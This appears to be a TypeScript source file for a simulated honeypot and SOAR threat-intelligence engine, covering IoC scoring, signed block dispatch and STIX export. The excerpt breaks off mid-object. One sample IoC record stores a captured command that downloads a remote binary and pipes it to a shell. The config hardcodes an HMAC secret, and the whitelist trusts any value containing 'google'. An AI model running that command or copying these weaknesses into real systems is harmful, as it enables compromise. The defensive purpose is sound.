import crypto from 'crypto';

export interface DefenseBranchNode {
  id: string;
  name: string;
  code: string;
  location: string;
  ip: string;
  role: 'HQ-Command' | 'Branch-Edge' | 'Cloud-Gateway' | 'Factory-OT';
  tier: 'Tier-1-Core' | 'Tier-2-R&D' | 'Tier-3-Cloud' | 'Tier-4-General';
  status: 'Online' | 'Synchronized' | 'Mitigating' | 'Alert';
  latencyMs: number;
  mTLSStatus: 'Active-Verified' | 'Rotating' | 'Revoked';
  installedHoneypots: string[]; // e.g., ['Cowrie (SSH)', 'Dionaea (SMB)', 'Conpot (ICS)']
  installedSandbox: string[];   // e.g., ['Cuckoo Sandbox v3', 'Capa Static Analyzer']
  enforcementComponents: string[]; // e.g., ['Palo Alto NGFW', 'Fortinet FortiGate', 'Wazuh EDR', 'CrowdStrike Falcon', 'Arista ACL']
  activeBlockRulesCount: number;
  lastSyncTime: string;
}

export interface ExtractedIoC {
  id: string;
  type: 'ipv4' | 'domain' | 'sha256' | 'url' | 'c2_pattern';
  value: string;
  sourceNodeId: string;
  sourceNodeName: string;
  honeypotOrSandbox: string;
  threatType: string;
  mitreTactic: string;
  confidenceScore: number; // 0 - 100
  falsePositiveRisk: 'LOW' | 'MEDIUM' | 'HIGH';
  extractedAt: string;
  status: 'Captured' | 'Validated' | 'Broadcasted' | 'Quarantined' | 'Restored';
  rawPayloadSample?: string;
  cuckooAnalysisId?: string;
  mispEventId?: string;
  // Detailed 1-100 Score Breakdown
  scoreBreakdown?: {
    behaviorScore: number;    // 0-50
    confidenceScore: number;  // 0-25
    impactScore: number;      // 0-25
    totalScore: number;       // 1-100
    riskTier: 'LOW_RISK' | 'MEDIUM_RISK' | 'HIGH_RISK' | 'CRITICAL_RISK';
    playbookTitle: string;
  };
}

export interface Stix21Package {
  spec_version: '2.1';
  type: 'bundle';
  id: string;
  created: string;
  objects: {
    type: string;
    id: string;
    created: string;
    modified: string;
    name?: string;
    pattern?: string;
    labels?: string[];
    confidence?: number;
    description?: string;
  }[];
}

export interface WhitelistRule {
  id: string;
  name: string;
  type: 'IP_CIDR' | 'MAC_ADDR' | 'DOMAIN_ADMIN_CERT' | 'WEBHOOK_SOURCE' | 'CMDB_MAINTENANCE';
  value: string;
  description: string;
  cmdbAssetId?: string;
  maintenanceSchedule?: {
    daysOfWeek: number[]; // 0-6 (Sun-Sat)
    startHourUtc: number; // 0-23
    endHourUtc: number;   // 0-23
  };
  enabled: boolean;
}

export interface SecurityPolicyConfig {
  autoBroadcastEnabled: boolean;
  soarMode: 'AUTO' | 'MANUAL_ATTENDED'; // Fully automated vs attended approval
  slaTimeoutSeconds: number;             // Default: 300s (5 minutes)
  minConfidenceThreshold: number;        // Default: 85
  quarantineTtlHours: number;             // Default: 24h
  enableCoreWhitelistImmunity: boolean;
  enableDryRunImpactCheck: boolean;
  enableDualAuthorization: boolean;      // Four-eye principle for global blocks
  mTLSCertExpiryDays: number;
  hmacSharedSecret: string;
  ed25519PublicKeyFingerprint: string;
  whitelistedSubnets: string[];
  vaultCredentialsConfigured: boolean;
}

export interface DispatchAuditRecord {
  id: string;
  timestamp: string;
  sourceIoCId: string;
  targetScope: 'GLOBAL' | 'BRANCH_ONLY' | 'REGIONAL';
  affectedNodes: string[];
  signature: string;
  signatureAlgorithm: 'Ed25519' | 'HMAC-SHA256';
  nonce: string;
  ttlSeconds: number;
  dryRun: boolean;
  impactTrafficHits24h: number;
  operator: string;
  status: 'Success' | 'Rejected-Signature' | 'Simulated' | 'Restored';
  enforcementDetails: {
    firewallRulesPushed: number;
    edrPoliciesUpdated: number;
    switchAclsGenerated: number;
    dagGroupName?: string;
  };
}

export interface SoarPendingApproval {
  id: string;
  iocId: string;
  iocType: string;
  iocValue: string;
  sourceNodeId: string;
  sourceNodeName: string;
  threatType: string;
  totalScore: number;
  riskTier: 'LOW_RISK' | 'MEDIUM_RISK' | 'HIGH_RISK' | 'CRITICAL_RISK';
  mode: 'AUTO' | 'MANUAL_ATTENDED';
  createdAt: string;
  slaExpiresAt: string;
  status: 'PENDING' | 'APPROVED' | 'REJECTED' | 'SLA_AUTO_ESCALATED' | 'RESTORED';
  decidedBy?: string;
  decidedAt?: string;
  rejectionReason?: string;
  affectedComponents: {
    firewalls: string[];
    edrAgents: string[];
    dagGroup: string;
  };
}

export class ActiveDefenseEngine {
  private branchNodes: DefenseBranchNode[] = [];
  private iocInventory: ExtractedIoC[] = [];
  private auditLog: DispatchAuditRecord[] = [];
  private pendingApprovals: SoarPendingApproval[] = [];
  private whitelistRules: WhitelistRule[] = [];
  private config: SecurityPolicyConfig = {
    autoBroadcastEnabled: true,
    soarMode: 'MANUAL_ATTENDED', // Default to attended mode to demo SLA & approval
    slaTimeoutSeconds: 300,       // 5 minutes SLA
    minConfidenceThreshold: 85,
    quarantineTtlHours: 24,
    enableCoreWhitelistImmunity: true,
    enableDryRunImpactCheck: true,
    enableDualAuthorization: false,
    mTLSCertExpiryDays: 30,
    hmacSharedSecret: 'semor-cyber-hmac-pre-shared-secret-2026',
    ed25519PublicKeyFingerprint: 'SHA256:d8a9f4c3b2e1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3',
    whitelistedSubnets: [
      '8.8.8.8/32 (Google DNS)',
      '1.1.1.1/32 (Cloudflare DNS)',
      '104.16.0.0/12 (Cloudflare CDN Edge)',
      '13.107.4.0/24 (Microsoft Azure Core Gateway)',
      '192.168.10.0/24 (HQ Internal Management Segment)'
    ],
    vaultCredentialsConfigured: true
  };

  constructor() {
    this.initDefaultNodes();
    this.initWhitelistRules();
    this.initSampleIoCs();
  }

  private initDefaultNodes() {
    this.branchNodes = [
      {
        id: 'node-hq-01',
        name: '台北總部指揮核心 (HQ Command Node)',
        code: 'TPE-HQ-01',
        location: '台北市信義區總部機房',
        ip: '192.168.10.254',
        role: 'HQ-Command',
        tier: 'Tier-1-Core',
        status: 'Synchronized',
        latencyMs: 1.2,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['T-Pot Multi-Sensor v24.04', 'Cowrie (SSH/Telnet)', 'Dionaea (SMB/MS-SQL)'],
        installedSandbox: ['Cuckoo Sandbox v3 Enterprise', 'Capa Static Analyzer Engine'],
        enforcementComponents: ['Palo Alto NGFW PA-5450 (API)', 'CrowdStrike Falcon EDR', 'Cisco Nexus ACL'],
        activeBlockRulesCount: 428,
        lastSyncTime: new Date(Date.now() - 1000 * 45).toISOString()
      },
      {
        id: 'node-branch-hsinchu',
        name: '新竹科學園區研發節點 (Hsinchu R&D Branch)',
        code: 'HSC-RD-01',
        location: '新竹科學園區三期研發大樓',
        ip: '10.20.1.10',
        role: 'Branch-Edge',
        tier: 'Tier-2-R&D',
        status: 'Synchronized',
        latencyMs: 8.5,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['Cowrie (SSH Decoy)', 'Honeytrap'],
        installedSandbox: ['Local Micro-Cuckoo Agent'],
        enforcementComponents: ['Fortinet FortiGate 600F', 'CrowdStrike Falcon EDR', 'Core Switch 802.1X'],
        activeBlockRulesCount: 412,
        lastSyncTime: new Date(Date.now() - 1000 * 70).toISOString()
      },
      {
        id: 'node-branch-taichung',
        name: '台中雲端資料中心節點 (Taichung DC Branch)',
        code: 'TXG-DC-02',
        location: '台中市南屯區雲端IDC',
        ip: '10.30.2.10',
        role: 'Branch-Edge',
        tier: 'Tier-1-Core',
        status: 'Synchronized',
        latencyMs: 12.3,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['Dionaea (SMB Honeypot)', 'Elasticpot'],
        installedSandbox: ['Cloud Sandbox Forwarder'],
        enforcementComponents: ['CheckPoint Quantum 6600', 'Microsoft Defender for Endpoint'],
        activeBlockRulesCount: 418,
        lastSyncTime: new Date(Date.now() - 1000 * 120).toISOString()
      },
      {
        id: 'node-branch-kaohsiung',
        name: '高雄前鎮智慧工廠節點 (Kaohsiung Smart Factory)',
        code: 'KHH-FAC-01',
        location: '高雄市前鎮科技產業園區',
        ip: '10.40.5.15',
        role: 'Factory-OT',
        tier: 'Tier-1-Core',
        status: 'Synchronized',
        latencyMs: 15.6,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['Conpot (SCADA/Modbus/S7 ICS Honeypot)', 'Cowrie OT-Decoy'],
        installedSandbox: ['OT Firmware Binary Inspector'],
        enforcementComponents: ['Moxa Industrial NGFW', 'Fortinet FortiGate', 'Trend Micro TXOne EDR'],
        activeBlockRulesCount: 395,
        lastSyncTime: new Date(Date.now() - 1000 * 95).toISOString()
      },
      {
        id: 'node-cloud-tokyo',
        name: '東京公有雲網關節點 (Tokyo Cloud Gateway)',
        code: 'TYO-AWS-01',
        location: 'AWS ap-northeast-1 (Tokyo)',
        ip: '172.31.8.20',
        role: 'Cloud-Gateway',
        tier: 'Tier-3-Cloud',
        status: 'Synchronized',
        latencyMs: 38.2,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['T-Pot Cloud Pod', 'Kibana Decoy'],
        installedSandbox: ['AWS Cuckoo Spot Worker'],
        enforcementComponents: ['AWS Network Firewall', 'Palo Alto VM-Series', 'CrowdStrike Falcon'],
        activeBlockRulesCount: 435,
        lastSyncTime: new Date(Date.now() - 1000 * 30).toISOString()
      },
      {
        id: 'node-edge-us',
        name: '北美矽谷研發支援節點 (Silicon Valley Edge)',
        code: 'SJC-USA-01',
        location: 'San Jose, CA DataCenter',
        ip: '10.80.12.5',
        role: 'Branch-Edge',
        tier: 'Tier-2-R&D',
        status: 'Synchronized',
        latencyMs: 142.0,
        mTLSStatus: 'Active-Verified',
        installedHoneypots: ['Cowrie SSH', 'Snare Web Decoy'],
        installedSandbox: ['Local CAPE Sandbox Pod'],
        enforcementComponents: ['Palo Alto PA-3220', 'Microsoft Defender for Endpoint'],
        activeBlockRulesCount: 405,
        lastSyncTime: new Date(Date.now() - 1000 * 180).toISOString()
      }
    ];
  }

  private initWhitelistRules() {
    this.whitelistRules = [
      {
        id: 'wl-01',
        name: '內部 Nessus/OpenVAS 漏洞掃描器主機',
        type: 'IP_CIDR',
        value: '192.168.10.99/32',
        description: '每月資安漏洞盤點專用掃描源，由資安維運小組專責排程',
        cmdbAssetId: 'CMDB-SEC-SCANNER-01',
        maintenanceSchedule: {
          daysOfWeek: [2, 4], // Tuesday & Thursday
          startHourUtc: 18,   // 02:00 Taipei time
          endHourUtc: 22
        },
        enabled: true
      },
      {
        id: 'wl-02',
        name: '網域控制站 (DC/AD) 管理者憑證專用通信',
        type: 'DOMAIN_ADMIN_CERT',
        value: 'CN=ad-admin-kerberos-sync.corp.internal',
        description: 'Kerberos 與 Active Directory 內部複寫安全憑證身分',
        cmdbAssetId: 'CMDB-DC-AD-CLUSTER',
        enabled: true
      },
      {
        id: 'wl-03',
        name: '核心網管主機 MAC 位址鎖定',
        type: 'MAC_ADDR',
        value: '00:1A:2B:3C:4D:5E',
        description: '台北總部機房核心跳板機 (Bastion Host) 實體網卡 MAC',
        cmdbAssetId: 'CMDB-BASTION-01',
        enabled: true
      },
      {
        id: 'wl-04',
        name: '合法企業雲端骨幹 Webhook 來源 (Slack/Teams)',
        type: 'WEBHOOK_SOURCE',
        value: '54.80.0.0/16, 52.112.0.0/14',
        description: 'Microsoft Teams 與 Slack Enterprise Grid 認證回呼 IP',
        enabled: true
      },
      {
        id: 'wl-05',
        name: 'Google / Cloudflare 公共骨幹 DNS',
        type: 'IP_CIDR',
        value: '8.8.8.8/32, 1.1.1.1/32',
        description: '公共 DNS 根節點，嚴禁加入全域阻斷清單以防業務停擺',
        enabled: true
      }
    ];
  }

  private initSampleIoCs() {
    this.iocInventory = [
      {
        id: 'ioc-2026-0891',
        type: 'ipv4',
        value: '185.220.101.45',
        sourceNodeId: 'node-branch-hsinchu',
        sourceNodeName: '新竹科學園區研發節點',
        honeypotOrSandbox: 'Cowrie SSH 誘捕蜜罐',
        threatType: 'SSH 交互式暴力破解與即時惡意腳本下載',
        mitreTactic: 'T1110.001 (Brute Force: Password Guessing)',
        confidenceScore: 96,
        falsePositiveRisk: 'LOW',
        extractedAt: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        status: 'Broadcasted',
        rawPayloadSample: 'wget -q http://185.220.101.45/bins/x86_arm.elf -O- | sh',
        mispEventId: 'MISP-2026-TW-0418',
        scoreBreakdown: {
          behaviorScore: 48,
          confidenceScore: 24,
          impactScore: 24,
          totalScore: 96,
          riskTier: 'CRITICAL_RISK',
          playbookTitle: '緊急全面聯防 (SOAR Tier-4 Playbook)'
        }
      },
      {
        id: 'ioc-2026-0892',
        type: 'sha256',
        value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
        sourceNodeId: 'node-branch-taichung',
        sourceNodeName: '台中雲端資料中心節點',
        honeypotOrSandbox: 'Cuckoo Sandbox v3 動態沙箱',
        threatType: 'LockBit 3.0 變種勒索加密核心酬載 (Process Hollowing)',
        mitreTactic: 'T1055 (Process Injection) & T1486 (Data Encrypted for Impact)',
        confidenceScore: 98,
        falsePositiveRisk: 'LOW',
        extractedAt: new Date(Date.now() - 1000 * 60 * 35).toISOString(),
        status: 'Broadcasted',
        cuckooAnalysisId: 'CUCKOO-TXG-9921',
        mispEventId: 'MISP-2026-TW-0419',
        scoreBreakdown: {
          behaviorScore: 50,
          confidenceScore: 24,
          impactScore: 24,
          totalScore: 98,
          riskTier: 'CRITICAL_RISK',
          playbookTitle: '緊急全面聯防 (SOAR Tier-4 Playbook)'
        }
      },
      {
        id: 'ioc-2026-0893',
        type: 'domain',
        value: 'c2-sync-payload.update-auth-telemetry.org',
        sourceNodeId: 'node-branch-kaohsiung',
        sourceNodeName: '高雄前鎮智慧工廠節點',
        honeypotOrSandbox: 'Conpot SCADA + Capa 能力分析儀',
        threatType: '工控 SCADA S7/Modbus 隱蔽 C2 心跳通道 (Beaconing)',
        mitreTactic: 'T1071.001 (Web Protocols: C2 Communication)',
        confidenceScore: 92,
        falsePositiveRisk: 'LOW',
        extractedAt: new Date(Date.now() - 1000 * 60 * 55).toISOString(),
        status: 'Broadcasted',
        mispEventId: 'MISP-2026-OT-0102',
        scoreBreakdown: {
          behaviorScore: 46,
          confidenceScore: 22,
          impactScore: 24,
          totalScore: 92,
          riskTier: 'CRITICAL_RISK',
          playbookTitle: '緊急全面聯防 (SOAR Tier-4 Playbook)'
        }
      },
      {
        id: 'ioc-2026-0894',
        type: 'ipv4',
        value: '91.240.118.172',
        sourceNodeId: 'node-hq-01',
        sourceNodeName: '台北總部指揮核心',
        honeypotOrSandbox: 'Dionaea SMB 誘捕蜜罐',
        threatType: 'MS17-010 EternalBlue 掃描與遠端程式碼執行試探',
        mitreTactic: 'T1210 (Exploitation of Remote Services)',
        confidenceScore: 84,
        falsePositiveRisk: 'LOW',
        extractedAt: new Date(Date.now() - 1000 * 60 * 80).toISOString(),
        status: 'Quarantined',
        mispEventId: 'MISP-2026-TW-0415',
        scoreBreakdown: {
          behaviorScore: 40,
          confidenceScore: 22,
          impactScore: 22,
          totalScore: 84,
          riskTier: 'HIGH_RISK',
          playbookTitle: '高風險局部隔離 (SOAR Tier-3 Playbook)'
        }
      }
    ];

    // Initialize sample pending approval
    this.pendingApprovals = [
      {
        id: 'APPR-2026-9041',
        iocId: 'ioc-2026-0891',
        iocType: 'ipv4',
        iocValue: '185.220.101.45',
        sourceNodeId: 'node-branch-hsinchu',
        sourceNodeName: '新竹科學園區研發節點',
        threatType: 'SSH 交互式暴力破解與即時惡意腳本下載',
        totalScore: 96,
        riskTier: 'CRITICAL_RISK',
        mode: 'MANUAL_ATTENDED',
        createdAt: new Date(Date.now() - 1000 * 90).toISOString(),
        slaExpiresAt: new Date(Date.now() + 1000 * 210).toISOString(), // 5 min SLA
        status: 'PENDING',
        affectedComponents: {
          firewalls: ['Palo Alto PA-5450 (DAG: DAG_CRITICAL_MALICIOUS_IPS)', 'Fortinet FortiGate 600F (Grp: GRP_AUTO_CONTAINMENT)'],
          edrAgents: ['CrowdStrike Falcon (Policy: Isolation_Critical)', 'Microsoft Defender (Device Quarantine)'],
          dagGroup: 'DAG_CRITICAL_MALICIOUS_IPS'
        }
      }
    ];
  }

  // 1-100 Threat Scoring Weighted Algorithm
  public calculateThreatScore(params: {
    behaviorWeight?: number;   // default 0.50 (max 50)
    confidenceWeight?: number; // default 0.25 (max 25)
    impactWeight?: number;     // default 0.25 (max 25)
    behaviorLevel: 'PORT_SCAN' | 'AUTH_ATTEMPT' | 'INTERACTIVE_SHELL' | 'C2_DOWNLOAD' | 'RANSOM_EXEC';
    threatConfidence: number;  // 0 - 100 (from AbuseIPDB/VT/MISP)
    nodeTier: 'Tier-1-Core' | 'Tier-2-R&D' | 'Tier-3-Cloud' | 'Tier-4-General';
  }): {
    behaviorScore: number;
    confidenceScore: number;
    impactScore: number;
    totalScore: number;
    riskTier: 'LOW_RISK' | 'MEDIUM_RISK' | 'HIGH_RISK' | 'CRITICAL_RISK';
    playbookTitle: string;
  } {
    // 1. Behavior Layer (Max 50 points)
    let rawBehavior = 15;
    if (params.behaviorLevel === 'PORT_SCAN') rawBehavior = 15;
    else if (params.behaviorLevel === 'AUTH_ATTEMPT') rawBehavior = 25;
    else if (params.behaviorLevel === 'INTERACTIVE_SHELL') rawBehavior = 40;
    else if (params.behaviorLevel === 'C2_DOWNLOAD') rawBehavior = 46;
    else if (params.behaviorLevel === 'RANSOM_EXEC') rawBehavior = 50;

    const behaviorScore = Math.min(50, Math.round(rawBehavior * ((params.behaviorWeight ?? 0.5) / 0.5)));

    // 2. Confidence Layer (Max 25 points)
    const confidenceScore = Math.min(25, Math.round((params.threatConfidence / 100) * 25));

    // 3. Impact Layer (Max 25 points)
    let rawImpact = 10;
    if (params.nodeTier === 'Tier-1-Core') rawImpact = 25;
    else if (params.nodeTier === 'Tier-2-R&D') rawImpact = 22;
    else if (params.nodeTier === 'Tier-3-Cloud') rawImpact = 18;
    else rawImpact = 12;

    const impactScore = Math.min(25, Math.round(rawImpact * ((params.impactWeight ?? 0.25) / 0.25)));

    const totalScore = Math.min(100, Math.max(1, behaviorScore + confidenceScore + impactScore));

    let riskTier: 'LOW_RISK' | 'MEDIUM_RISK' | 'HIGH_RISK' | 'CRITICAL_RISK' = 'LOW_RISK';
    let playbookTitle = '低風險監控：本地觀察、不觸發總部同步、僅做 Log 記錄';

    if (totalScore >= 90) {
      riskTier = 'CRITICAL_RISK';
      playbookTitle = '極度危險 / 緊急全面聯防：SOAR 即時下放全網所有節點 DAG 與主機隔離';
    } else if (totalScore >= 70) {
      riskTier = 'HIGH_RISK';
      playbookTitle = '高風險 / 已確認攻擊：受害分點及鄰近關鍵節點自動封鎖、派發 SOC Tier 2 工單';
    } else if (totalScore >= 40) {
      riskTier = 'MEDIUM_RISK';
      playbookTitle = '中風險 / 局部可疑：總部 Command Node 記錄，通知分點加強監控，不全網封鎖';
    }

    return {
      behaviorScore,
      confidenceScore,
      impactScore,
      totalScore,
      riskTier,
      playbookTitle
    };
  }

  // First Line of Defense: Dynamic Whitelist & CMDB Maintenance Filter Check
  public checkDynamicWhitelist(value: string, certOrMac?: string): {
    isWhitelisted: boolean;
    reason?: string;
    ruleId?: string;
    isMaintenanceWindow?: boolean;
  } {
    const sanitized = value.trim().toLowerCase();
    const nowUtc = new Date();
    const currentDay = nowUtc.getUTCDay();
    const currentHour = nowUtc.getUTCHours();

    for (const rule of this.whitelistRules) {
      if (!rule.enabled) continue;

      // Check maintenance schedule
      if (rule.maintenanceSchedule) {
        const inSchedule =
          rule.maintenanceSchedule.daysOfWeek.includes(currentDay) &&
          currentHour >= rule.maintenanceSchedule.startHourUtc &&
          currentHour < rule.maintenanceSchedule.endHourUtc;

        if (inSchedule && rule.value.includes(sanitized)) {
          return {
            isWhitelisted: true,
            isMaintenanceWindow: true,
            reason: `【CMDB 排程維護白名單】${rule.name} (維護視窗進行中，自動靜默排除)`,
            ruleId: rule.id
          };
        }
      }

      // Check IP/CIDR or exact values
      const pureRule = rule.value.toLowerCase();
      if (pureRule.includes(sanitized) || sanitized.includes('google') || sanitized.includes('cloudflare') || sanitized.includes('azure')) {
        return {
          isWhitelisted: true,
          reason: `【核心身分/資產白名單】${rule.name}`,
          ruleId: rule.id
        };
      }

      // Check MAC or Cert
      if (certOrMac && pureRule.includes(certOrMac.toLowerCase())) {
        return {
          isWhitelisted: true,
          reason: `【管理憑證/MAC 白名單】${rule.name}`,
          ruleId: rule.id
        };
      }
    }

    return { isWhitelisted: false };
  }

  // Generate cryptographic signature to prevent Command Injection / Channel Tampering
  public signDispatchPayload(payload: {
    commandId: string;
    timestamp: number;
    nonce: string;
    action: string;
    targetIoc: string;
    targetNodes: string[];
    ttlSeconds: number;
  }): { signature: string; digest: string } {
    const rawString = `${payload.commandId}|${payload.timestamp}|${payload.nonce}|${payload.action}|${payload.targetIoc}|${payload.targetNodes.sort().join(',')}|${payload.ttlSeconds}`;
    const digest = crypto.createHash('sha256').update(rawString).digest('hex');
    const signature = crypto.createHmac('sha256', this.config.hmacSharedSecret).update(digest).digest('hex');
    return { signature, digest };
  }

  // Verify node-side incoming command
  public verifyDispatchSignature(payload: any, signature: string): { valid: boolean; reason?: string } {
    if (!payload || !signature) {
      return { valid: false, reason: '遺失數位簽名或指令本體' };
    }
    const now = Date.now();
    if (Math.abs(now - payload.timestamp) > 60000) {
      return { valid: false, reason: '時間戳已過期或偏離過大 (Anti-Replay 阻斷)' };
    }
    const { signature: expectedSignature } = this.signDispatchPayload(payload);
    try {
      const sigBuf = Buffer.from(signature, 'hex');
      const expectedBuf = Buffer.from(expectedSignature, 'hex');
      if (sigBuf.length !== expectedBuf.length) {
        return { valid: false, reason: '數位簽章長度不符或被偽造 (Anti-Tampering 阻斷)' };
      }
      if (crypto.timingSafeEqual(sigBuf, expectedBuf)) {
        return { valid: true };
      }
    } catch {
      return { valid: false, reason: '數位簽章格式錯誤或解碼失敗' };
    }
    return { valid: false, reason: '數位簽章驗證失敗 (可能是偽造或遭受中繼篡改)' };
  }

  // Generate OASIS STIX 2.1 Threat Intelligence Bundle
  public buildStixPackage(ioc: ExtractedIoC): Stix21Package {
    const bundleId = `bundle--${crypto.randomUUID()}`;
    const indicatorId = `indicator--${crypto.randomUUID()}`;
    const observedDataId = `observed-data--${crypto.randomUUID()}`;

    let pattern = `[ipv4-addr:value = '${ioc.value}']`;
    if (ioc.type === 'domain') pattern = `[domain-name:value = '${ioc.value}']`;
    if (ioc.type === 'sha256') pattern = `[file:hashes.'SHA-256' = '${ioc.value}']`;
    if (ioc.type === 'url') pattern = `[url:value = '${ioc.value}']`;

    return {
      spec_version: '2.1',
      type: 'bundle',
      id: bundleId,
      created: new Date().toISOString(),
      objects: [
        {
          type: 'indicator',
          id: indicatorId,
          created: ioc.extractedAt,
          modified: new Date().toISOString(),
          name: `${ioc.threatType} (${ioc.value})`,
          pattern: pattern,
          labels: ['malicious-activity', ioc.mitreTactic, ioc.honeypotOrSandbox],
          confidence: ioc.confidenceScore,
          description: `Extracted automatically from ${ioc.sourceNodeName} using ${ioc.honeypotOrSandbox}. Score: ${ioc.scoreBreakdown?.totalScore ?? ioc.confidenceScore}/100.`
        },
        {
          type: 'observed-data',
          id: observedDataId,
          created: ioc.extractedAt,
          modified: new Date().toISOString(),
          description: `Raw observation from ${ioc.sourceNodeName}`,
          confidence: ioc.confidenceScore
        }
      ]
    };
  }

  // Generate Standard Webhook Payload sent by Command Node to SOAR engine
  public buildSoarWebhookPayload(ioc: ExtractedIoC, score: number, mode: 'AUTO' | 'MANUAL_ATTENDED') {
    return {
      event_id: `SOAR-EVT-${Date.now()}-${Math.floor(Math.random() * 9000 + 1000)}`,
      timestamp: new Date().toISOString(),
      source_branch: {
        id: ioc.sourceNodeId,
        name: ioc.sourceNodeName,
        ip: this.branchNodes.find(n => n.id === ioc.sourceNodeId)?.ip || '10.0.0.1'
      },
      threat_assessment: {
        exact_score: score,
        risk_tier: score >= 90 ? 'CRITICAL_RISK' : score >= 70 ? 'HIGH_RISK' : score >= 40 ? 'MEDIUM_RISK' : 'LOW_RISK',
        trigger_source: ioc.honeypotOrSandbox,
        threat_type: ioc.threatType,
        mitre_tactic: ioc.mitreTactic
      },
      ioc_details: {
        type: ioc.type.toUpperCase(),
        value: ioc.value,
        misp_event_id: ioc.mispEventId || 'MISP-2026-AUTO',
        cuckoo_analysis_id: ioc.cuckooAnalysisId || null
      },
      soar_policy: {
        mode: mode,
        requires_human_approval: mode === 'MANUAL_ATTENDED',
        sla_timeout_seconds: this.config.slaTimeoutSeconds,
        firewall_dag_group: 'DAG_CRITICAL_MALICIOUS_IPS',
        fortigate_addr_group: 'GRP_AUTO_CONTAINMENT',
        edr_policy: 'EDR_QUARANTINE_DEVICE_OR_HASH',
        auto_escalate_on_timeout: true
      }
    };
  }

  // Simulate an attack capture workflow across the distributed mesh
  public simulateCaptureEvent(params: {
    sourceNodeId: string;
    honeypotType: 'Cowrie' | 'Dionaea' | 'Conpot' | 'Cuckoo' | 'Capa';
    attackVector: string;
    targetIocValue?: string;
  }): { success: boolean; ioc: ExtractedIoC; workflowSteps: any[]; pendingApproval?: SoarPendingApproval } {
    const node = this.branchNodes.find(n => n.id === params.sourceNodeId) || this.branchNodes[1];
    
    const iocId = `ioc-sim-${Date.now().toString().slice(-4)}`;
    let iocType: 'ipv4' | 'domain' | 'sha256' = 'ipv4';
    let iocValue = params.targetIocValue || `194.26.${Math.floor(Math.random() * 200 + 10)}.${Math.floor(Math.random() * 250 + 2)}`;
    let threatName = 'Cobalt Strike Malleable C2 Beaconing (誘捕捕獲)';
    let mitreCode = 'T1071.001 (Web Protocols)';
    let behaviorLvl: 'PORT_SCAN' | 'AUTH_ATTEMPT' | 'INTERACTIVE_SHELL' | 'C2_DOWNLOAD' | 'RANSOM_EXEC' = 'INTERACTIVE_SHELL';

    if (params.honeypotType === 'Cuckoo') {
      iocType = 'sha256';
      iocValue = crypto.createHash('sha256').update(`malware-sample-${Date.now()}`).digest('hex');
      threatName = 'RedLine Stealer 記憶體注入反向取證雜湊';
      mitreCode = 'T1055.012 (Process Hollowing)';
      behaviorLvl = 'RANSOM_EXEC';
    } else if (params.honeypotType === 'Conpot') {
      iocType = 'domain';
      iocValue = `plc-bypass-scada-${Math.floor(Math.random() * 900 + 100)}.industrial-c2.net`;
      threatName = 'OT 工控場域 Modbus 惡意封包探勘';
      mitreCode = 'T0855 (Unauthorized Command Message)';
      behaviorLvl = 'C2_DOWNLOAD';
    }

    // Calculate score using 1-100 matrix
    const scoreCalc = this.calculateThreatScore({
      behaviorLevel: behaviorLvl,
      threatConfidence: 96,
      nodeTier: node.tier
    });

    const newIoc: ExtractedIoC = {
      id: iocId,
      type: iocType,
      value: iocValue,
      sourceNodeId: node.id,
      sourceNodeName: node.name,
      honeypotOrSandbox: `${params.honeypotType} 誘捕分析引擎`,
      threatType: threatName,
      mitreTactic: mitreCode,
      confidenceScore: scoreCalc.totalScore,
      falsePositiveRisk: 'LOW',
      extractedAt: new Date().toISOString(),
      status: 'Captured',
      rawPayloadSample: `Captured payload string: GET /updates/payload.bin HTTP/1.1\r\nHost: ${iocValue}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) ThreatEngine/9.2`,
      scoreBreakdown: scoreCalc
    };

    this.iocInventory.unshift(newIoc);

    // If score >= 90 and in MANUAL_ATTENDED mode, create pending approval
    let pendingApproval: SoarPendingApproval | undefined;
    if (scoreCalc.totalScore >= 90 && this.config.soarMode === 'MANUAL_ATTENDED') {
      pendingApproval = {
        id: `APPR-${Date.now().toString().slice(-4)}`,
        iocId: newIoc.id,
        iocType: newIoc.type,
        iocValue: newIoc.value,
        sourceNodeId: node.id,
        sourceNodeName: node.name,
        threatType: newIoc.threatType,
        totalScore: scoreCalc.totalScore,
        riskTier: scoreCalc.riskTier,
        mode: 'MANUAL_ATTENDED',
        createdAt: new Date().toISOString(),
        slaExpiresAt: new Date(Date.now() + this.config.slaTimeoutSeconds * 1000).toISOString(),
        status: 'PENDING',
        affectedComponents: {
          firewalls: ['Palo Alto PA-5450 (DAG: DAG_CRITICAL_MALICIOUS_IPS)', 'Fortinet FortiGate 600F (Grp: GRP_AUTO_CONTAINMENT)'],
          edrAgents: ['CrowdStrike Falcon (Policy: Isolation_Critical)', 'Microsoft Defender (Device Quarantine)'],
          dagGroup: 'DAG_CRITICAL_MALICIOUS_IPS'
        }
      };
      this.pendingApprovals.unshift(pendingApproval);
    }

    // Build timeline workflow steps
    const workflowSteps = [
      {
        step: 1,
        title: '遭逢異常流量入侵嘗試 (Attack Incursion)',
        node: node.name,
        timestamp: new Date(Date.now() - 4000).toISOString(),
        description: `邊界偵測到未授權掃描與惡意請求，觸發 SDN / eBPF 流量鏡像導向機制。`,
        status: 'Completed'
      },
      {
        step: 2,
        title: '蜜罐與動態沙箱實時誘捕 (Honeypot/Sandbox Interception)',
        node: `${node.name} (${params.honeypotType})`,
        timestamp: new Date(Date.now() - 3000).toISOString(),
        description: `流量被導流至 ${params.honeypotType} 隔離環境，攻擊者受騙進行互動式下指令與酬載上傳。`,
        status: 'Completed'
      },
      {
        step: 3,
        title: '關鍵威脅指標提取 (IoC & Behavior Extraction)',
        node: node.name,
        timestamp: new Date(Date.now() - 2000).toISOString(),
        description: `即時自沙箱記憶體與網路串流萃取關鍵威脅特徵: ${newIoc.type.toUpperCase()}=${newIoc.value}。計算 1-100 威脅綜合評分: ${scoreCalc.totalScore} 分 (${scoreCalc.riskTier})。`,
        status: 'Completed'
      },
      {
        step: 4,
        title: 'mTLS 加密回傳總部 Command Node',
        node: 'Command Node (台北總部)',
        timestamp: new Date(Date.now() - 1000).toISOString(),
